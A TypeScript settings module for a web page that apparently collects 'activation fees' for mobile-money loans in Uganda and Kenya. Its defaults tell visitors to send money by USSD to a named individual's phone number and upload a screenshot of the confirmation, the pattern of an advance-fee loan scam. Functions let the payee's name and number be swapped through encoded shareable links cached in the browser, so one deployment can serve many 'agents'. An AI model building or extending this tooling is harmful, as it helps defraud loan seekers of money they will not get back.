import rawSettings from '../../settings.json';

export interface AppSettings {
  agentName: string;
  agentNumber: string;
  rawNumber: string;
  whatsappNumber: string;
  whatsappRaw: string;
  step1: string;
  step2: string;
  step3: string;
  noticeText: string;
  githubToken?: string;
  githubRepo?: string;
}

export const defaultSettings: AppSettings = {
  agentName: rawSettings.agentName || 'AMOS ROTICH',
  agentNumber: rawSettings.agentNumber || '+254 780571549',
  rawNumber: rawSettings.rawNumber || '254780571549',
  whatsappNumber: rawSettings.whatsappNumber || '+254 780571549',
  whatsappRaw: rawSettings.whatsappRaw || '254780571549',
  step1: rawSettings.step1 || 'Dial *165*1*2# (MTN) or *185# (Airtel).',
  step2: rawSettings.step2 || "Enter recipient's number 254780571549 and amount.",
  step3: rawSettings.step3 || 'Take a screenshot of the confirmation SMS and upload it below.',
  noticeText: rawSettings.noticeText || 'Verifying activation fee',
  githubToken: (rawSettings as any).githubToken || '',
  githubRepo: (rawSettings as any).githubRepo || 'supportmomoloans-glitch/Activation-fee-Uganda-mosticah',
};

const SETTINGS_STORAGE_KEY = 'momo_cached_settings';

/**
 * Parses settings embedded in URL (e.g. ?cfg=base64 or #cfg=base64 or query params)
 */
export function parseUrlSettings(): Partial<AppSettings> | null {
  if (typeof window === 'undefined') return null;

  try {
    const url = new URL(window.location.href);
    const searchParams = url.searchParams;
    const hash = window.location.hash;

    // Check ?cfg= or #cfg=
    let encodedCfg = searchParams.get('cfg') || searchParams.get('settings');
    if (!encodedCfg && hash.includes('cfg=')) {
      const match = hash.match(/cfg=([^&]+)/);
      if (match) encodedCfg = match[1];
    }

    if (encodedCfg) {
      try {
        const decoded = decodeURIComponent(atob(encodedCfg));
        const parsed = JSON.parse(decoded);
        if (typeof parsed === 'object' && parsed !== null) {
          return parsed;
        }
      } catch {
        // Try direct JSON decode
        const decoded = decodeURIComponent(encodedCfg);
        const parsed = JSON.parse(decoded);
        if (typeof parsed === 'object' && parsed !== null) {
          return parsed;
        }
      }
    }

    // Direct query params fallback (e.g., ?agent=254780571549&name=EZRA)
    const agentNum = searchParams.get('agent') || searchParams.get('agentNumber');
    const agentName = searchParams.get('name') || searchParams.get('agentName');
    const wa = searchParams.get('whatsapp') || searchParams.get('whatsappRaw');

    if (agentNum || agentName || wa) {
      const result: Partial<AppSettings> = {};
      if (agentNum) {
        result.rawNumber = agentNum.replace(/\D/g, '');
        result.agentNumber = agentNum.startsWith('+') ? agentNum : `+${agentNum}`;
      }
      if (agentName) result.agentName = agentName;
      if (wa) {
        result.whatsappRaw = wa.replace(/\D/g, '');
        result.whatsappNumber = wa.startsWith('+') ? wa : `+${wa}`;
      }
      return result;
    }
  } catch (err) {
    console.warn('[Settings] Failed to parse URL settings:', err);
  }

  return null;
}

/**
 * Returns currently resolved settings by checking:
 * 1. Embedded URL settings (?cfg=...)
 * 2. localStorage ('momo_cached_settings')
 * 3. Default settings (bundled settings.json)
 */
export function getResolvedSettings(): AppSettings {
  if (typeof window === 'undefined') return { ...defaultSettings };

  let current = { ...defaultSettings };

  // 1. Check localStorage
  try {
    const cached = localStorage.getItem(SETTINGS_STORAGE_KEY);
    if (cached) {
      const parsed = JSON.parse(cached);
      current = { ...current, ...parsed };
    }
  } catch {}

  // 2. Check URL (overrides and persists to localStorage)
  const urlOverrides = parseUrlSettings();
  if (urlOverrides) {
    current = { ...current, ...urlOverrides };
    try {
      localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(current));
    } catch {}
  }

  return current;
}

/**
 * Save settings to localStorage and trigger storage event
 */
export function saveSettingsToLocal(settings: AppSettings): void {
  if (typeof window === 'undefined') return;
  try {
    localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(settings));
    window.dispatchEvent(new Event('momo_settings_updated'));
  } catch {}
}

/**
 * Generates an embedded link containing these settings in ?cfg=
 * When opened on ANY browser, device, or incognito tab, the settings are immediately loaded.
 */
export function generateUniversalLink(settings: AppSettings, path = '/'): string {
  if (typeof window === 'undefined') return '';

  const cleanPayload: Partial<AppSettings> = {
    agentName: settings.agentName,
    agentNumber: settings.agentNumber,
    rawNumber: settings.rawNumber,
    whatsappNumber: settings.whatsappNumber,
    whatsappRaw: settings.whatsappRaw,
    step1: settings.step1,
    step2: settings.step2,
    step3: settings.step3,
    noticeText: settings.noticeText,
  };

  const jsonStr = JSON.stringify(cleanPayload);
  let encoded = '';
  try {
    encoded = btoa(encodeURIComponent(jsonStr));
  } catch {
    encoded = encodeURIComponent(jsonStr);
  }

  const origin = window.location.origin;
  const cleanPath = path.startsWith('/') ? path : `/${path}`;
  return `${origin}${cleanPath}?cfg=${encoded}`;
}

/**
 * Formats settings as a JSON string for Vercel's APP_SETTINGS environment variable
 */
export function formatVercelEnvJson(settings: AppSettings): string {
  const cleanPayload: Partial<AppSettings> = {
    agentName: settings.agentName,
    agentNumber: settings.agentNumber,
    rawNumber: settings.rawNumber,
    whatsappNumber: settings.whatsappNumber,
    whatsappRaw: settings.whatsappRaw,
    step1: settings.step1,
    step2: settings.step2,
    step3: settings.step3,
    noticeText: settings.noticeText,
  };
  return JSON.stringify(cleanPayload);
}
